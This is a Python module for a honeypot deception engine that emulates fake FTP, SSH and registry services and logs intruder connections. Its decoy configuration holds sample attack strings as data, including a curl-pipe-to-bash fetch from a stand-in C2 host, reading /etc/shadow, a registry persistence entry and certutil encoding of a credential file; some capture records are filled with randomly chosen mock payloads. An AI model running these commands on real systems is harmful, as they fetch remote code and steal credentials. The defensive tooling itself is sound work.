"""
AegisAI Honeypot Emulator — Deception-Based Active Defense Engine.
Dynamically traps zero-day anomalies and unknown intrusion patterns flagged by the Isolation Forest detector into isolated synthetic traps (Fake FTP, SSH, Registry, Decoy Files).
"""
import asyncio
import hashlib
import random
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional
from loguru import logger
from app.deception.trap_logger import trap_logger
import logging


# Decoy targets configuration
DECOY_CONFIG = {
    "FAKE_FTP": {
        "target": "port:2121",
        "service_name": "Aegis Synthetic FTP Server v2.4",
        "mock_payloads": [
            "USER admin\r\nPASS Winter2026!\r\nRETR production_db_backup.sql",
            "USER root\r\nPASS toor\r\nLIST /restricted/keys/",
            "USER backup_svc\r\nPASS backupPass123\r\nSTOR malware_dropper.bin",
        ],
        "commands": ["RETR production_db_backup.sql", "LIST /restricted/keys/", "STOR malware_dropper.bin"],
    },
    "FAKE_SSH": {
        "target": "port:2222",
        "service_name": "OpenSSH 8.9p1 Ubuntu-3ubuntu0.1 Decoy",
        "mock_payloads": [
            "SSH-2.0-OpenSSH_8.9p1\r\nkexinit\r\nAuth: root / id_rsa brute-force probe",
            "SSH-2.0-libssh_0.9.3\r\nsudo su -c 'curl -s http://c2.evil/stage2.sh | bash'",
            "SSH-2.0-PuTTY_Release_0.76\r\ncat /etc/shadow > /tmp/out.txt",
        ],
        "commands": ["sudo su -c 'curl -s http://c2.evil/stage2.sh | bash'", "cat /etc/shadow", "uname -a; whoami"],
    },
    "FAKE_REGISTRY": {
        "target": "HKLM\\SOFTWARE\\AegisDecoy\\AdminCreds",
        "service_name": "Windows Decoy Registry Hive",
        "mock_payloads": [
            "reg.exe query HKLM\\SOFTWARE\\AegisDecoy\\AdminCreds /v MasterPassword",
            "powershell.exe -c \"Get-ItemProperty 'HKLM:\\SOFTWARE\\AegisDecoy\\AdminCreds'\"",
            "reg.exe add HKLM\\SOFTWARE\\AegisDecoy\\Persistence /t REG_SZ /d 'C:\\AegisDecoy\\beacon.exe'",
        ],
        "commands": ["reg query HKLM\\SOFTWARE\\AegisDecoy\\AdminCreds", "Get-ItemProperty HKLM:\\SOFTWARE\\AegisDecoy", "reg add Persistence"],
    },
    "DECOY_FILE": {
        "target": "C:\\AegisDecoy\\shadow_backup",
        "service_name": "Canary Credential File Decoy",
        "mock_payloads": [
            "type C:\\AegisDecoy\\shadow_backup | findstr /i password",
            "Get-Content C:\\AegisDecoy\\shadow_backup -Raw",
            "certutil.exe -encode C:\\AegisDecoy\\shadow_backup C:\\Users\\Public\\exfil.b64",
        ],
        "commands": ["type C:\\AegisDecoy\\shadow_backup", "Get-Content C:\\AegisDecoy\\shadow_backup", "certutil -encode"],
    },
}


class HoneypotEmulator:
    """Deception Engine that dynamically redirects suspicious connections to sandboxed synthetic traps.
    Provides utility methods for trap selection, redirection, and synthetic listeners.
    """

    def __init__(self):
        self._active_servers: List[asyncio.Server] = []
        self._is_running = False

    def select_trap_type(self, event_payload: dict) -> str:
        """Select the most contextually relevant trap based on threat parameters.
        Returns one of the keys from ``DECOY_CONFIG``.
        """
        explicit = event_payload.get("trap_type")
        if explicit in DECOY_CONFIG:
            return explicit

        port = int(event_payload.get("port", 0))
        threat_type = str(event_payload.get("threat_type", "")).lower()
        proc_name = str(event_payload.get("telemetry", {}).get("processName", "")).lower()

        if port in [21, 2121] or "ftp" in threat_type or "exfiltration" in threat_type:
            return "FAKE_FTP"
        elif port in [22, 2222] or "ssh" in threat_type or "lateral" in threat_type:
            return "FAKE_SSH"
        elif "registry" in threat_type or "persistence" in threat_type or "reg.exe" in proc_name:
            return "FAKE_REGISTRY"
        elif "beacon" in threat_type or "scan" in threat_type or port in [4444, 8080]:
            return random.choice(["FAKE_FTP", "FAKE_SSH", "FAKE_REGISTRY", "DECOY_FILE"])
        else:
            return "DECOY_FILE"

    def redirect_threat(self, event_payload: dict) -> Dict[str, Any]:
        """Redirect a suspicious threat into a synthetic honeypot trap.
        This function is called by the inference pipeline when an anomaly is detected.
        It selects an appropriate decoy, logs the capture, and returns the capture record.
        """
        source_ip = event_payload.get("source_ip", "198.51.100.42")
        source_port = int(event_payload.get("port", random.randint(1024, 65535)))
        
        trap_type = self.select_trap_type(event_payload)
        decoy_meta = DECOY_CONFIG.get(trap_type, DECOY_CONFIG["DECOY_FILE"])

        # Determine or synthesize payload and executed command
        custom_payload = event_payload.get("raw_payload")
        if not custom_payload:
            custom_payload = random.choice(decoy_meta["mock_payloads"])
        
        custom_command = event_payload.get("command_executed")
        if not custom_command:
            custom_command = random.choice(decoy_meta["commands"])

        logger.warning(
            f"[DECEPTION-ENGINE] Routing zero-day anomaly {source_ip}:{source_port} "
            f"to Honeypot trap '{trap_type}' targeting '{decoy_meta['target']}'"
        )

        capture_record = trap_logger.log_trap_capture(
            source_ip=source_ip,
            source_port=source_port,
            trap_type=trap_type,
            decoy_target=decoy_meta["target"],
            raw_payload=custom_payload,
            command_executed=custom_command,
            isolation_status="TRAPPED",
        )

        return capture_record

    # ── Synthetic Network Protocol Emulators (Async Socket Listeners)──

    async def _handle_ftp_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Asynchronously emulate a fake FTP server session."""
        peer = writer.get_extra_info("peername")
        source_ip = peer[0] if peer else "127.0.0.1"
        source_port = peer[1] if peer else 2121
        logger.info(f"[HONEYPOT-FTP] Connection received from {source_ip}:{source_port}")

        try:
            writer.write(b"220 Aegis Synthetic Backup FTP Server Ready\r\n")
            await writer.drain()

            buffer = []
            while True:
                line = await asyncio.wait_for(reader.readline(), timeout=15.0)
                if not line:
                    break
                decoded = line.decode("utf-8", errors="ignore").strip()
                buffer.append(decoded)
                
                if decoded.upper().startswith("USER"):
                    writer.write(b"331 Password required for admin\r\n")
                elif decoded.upper().startswith("PASS"):
                    writer.write(b"230 User logged in, proceed with caution.\r\n")
                elif decoded.upper().startswith("QUIT"):
                    writer.write(b"221 Goodbye.\r\n")
                    await writer.drain()
                    break
                else:
                    writer.write(b"500 Command not understood in sandboxed mode.\r\n")
                await writer.drain()

            raw_payload = "\n".join(buffer) if buffer else "PROBE_CONNECT"
            trap_logger.log_trap_capture(
                source_ip=source_ip,
                source_port=source_port,
                trap_type="FAKE_FTP",
                decoy_target="port:2121",
                raw_payload=raw_payload,
                command_executed=buffer[-1] if buffer else "N/A",
                isolation_status="TRAPPED",
            )
        except Exception as e:
            logger.debug(f"[HONEYPOT-FTP] Session ended: {e}")
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def _handle_ssh_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Asynchronously emulate a fake SSH banner probe listener."""
        peer = writer.get_extra_info("peername")
        source_ip = peer[0] if peer else "127.0.0.1"
        source_port = peer[1] if peer else 2222
        logger.info(f"[HONEYPOT-SSH] Connection received from {source_ip}:{source_port}")

        try:
            writer.write(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n")
            await writer.drain()
            client_banner = await asyncio.wait_for(reader.readline(), timeout=10.0)
            raw = client_banner.decode("utf-8", errors="ignore").strip() if client_banner else "EMPTY_PROBE"

            trap_logger.log_trap_capture(
                source_ip=source_ip,
                source_port=source_port,
                trap_type="FAKE_SSH",
                decoy_target="port:2222",
                raw_payload=raw,
                command_executed="SSH Protocol Handshake Probe",
                isolation_status="TRAPPED",
            )
        except Exception as e:
            logger.debug(f"[HONEYPOT-SSH] Session ended: {e}")
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def _handle_registry_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Placeholder listener for a fake Windows Registry service (port 135).
        It simply reads a line, logs the capture, and closes the connection.
        """
        peer = writer.get_extra_info("peername")
        source_ip = peer[0] if peer else "127.0.0.1"
        source_port = peer[1] if peer else 135
        logger.info(f"[HONEYPOT-REGISTRY] Connection received from {source_ip}:{source_port}")
        try:
            line = await asyncio.wait_for(reader.readline(), timeout=10.0)
            raw = line.decode("utf-8", errors="ignore").strip() if line else "EMPTY_PROBE"
            trap_logger.log_trap_capture(
                source_ip=source_ip,
                source_port=source_port,
                trap_type="FAKE_REGISTRY",
                decoy_target="HKLM\\SOFTWARE\\AegisDecoy\\AdminCreds",
                raw_payload=raw,
                command_executed="REGISTRY_PROBE",
                isolation_status="TRAPPED",
            )
        except Exception as e:
            logger.debug(f"[HONEYPOT-REGISTRY] Session ended: {e}")
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def start_synthetic_listeners(self, host: str = "127.0.0.1") -> None:
        """Start async socket listeners for mock services on secondary ports.
        Starts FTP, SSH, and Registry listeners if not already running.
        """
        if self._is_running:
            return

        ports = [
            (2121, self._handle_ftp_client, "FTP"),
            (2222, self._handle_ssh_client, "SSH"),
            (135, self._handle_registry_client, "REGISTRY"),
        ]
        for port, handler, name in ports:
            try:
                server = await asyncio.start_server(handler, host, port)
                self._active_servers.append(server)
                logger.info(f"[HONEYPOT] Active synthetic {name} listener running on {host}:{port}")
            except Exception as e:
                logger.warning(f"[HONEYPOT] Could not bind synthetic {name} listener to port {port}: {e}")

        self._is_running = True

    async def stop_synthetic_listeners(self):
        """Cleanly close all active synthetic listener servers."""
        for server in self._active_servers:
            server.close()
            try:
                await server.wait_closed()
            except Exception:
                pass
        self._active_servers.clear()
        self._is_running = False
        logger.info("[HONEYPOT] Synthetic listeners stopped.")


# The Global singleton emulator
honeypot_emulator = HoneypotEmulator()
